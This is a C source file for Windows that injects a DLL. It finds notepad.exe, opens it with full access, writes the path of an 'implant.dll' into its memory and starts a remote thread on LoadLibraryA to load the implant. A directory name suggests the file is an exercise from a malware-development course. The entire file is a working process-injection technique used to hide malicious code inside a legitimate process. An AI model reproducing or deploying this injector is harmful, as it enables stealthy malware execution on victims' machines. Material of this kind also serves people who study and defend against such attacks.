#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

int FindTarget(const char *procname) {
	HANDLE hProc;
	PROCESSENTRY32 pe32;
	int PID = 0;
	
	hProc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	
	if (INVALID_HANDLE_VALUE == hProc) return 0;
	
	printf("VALID HANDLE VALUE \n");
	
	pe32.dwSize = sizeof(PROCESSENTRY32);
	
	if (!Process32Next(hProc, &pe32)) {
		CloseHandle(hProc);
		return 0;
	}
	
	while (Process32Next(hProc, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			PID = pe32.th32ProcessID;
			break;
		}
	}
	CloseHandle(hProc);
	return PID;
}

int main(void) {
	HANDLE hProc = NULL;
	PVOID hRemote = NULL;
	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
	
	char DLL[] = "C:\\MD\\RTO-maldev\\RTOIN\\07-CodeInjection\\DLL\\implant.dll";
	char TARGET[] = "notepad.exe";
	int PID = 0;
	
	PID = FindTarget("notepad.exe");
	
	if (PID) {
		printf("P I D - %d\n", PID);
		pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(PID));
		if (hProc) {
			hRemote = VirtualAllocEx(hProc, NULL, sizeof DLL, MEM_COMMIT, PAGE_READWRITE);
			WriteProcessMemory(hProc, hRemote, (LPVOID) DLL, sizeof(DLL), NULL);
			CreateRemoteThread(hProc, NULL, 0, pLoadLibrary, hRemote, 0, NULL);
			printf("MEMORY - %d\n", hRemote);
			CloseHandle(hProc);
		}
		else {
			printf("P R O C E S S - F A I L E D");
			return -2;
		}
	}
	return 0;
}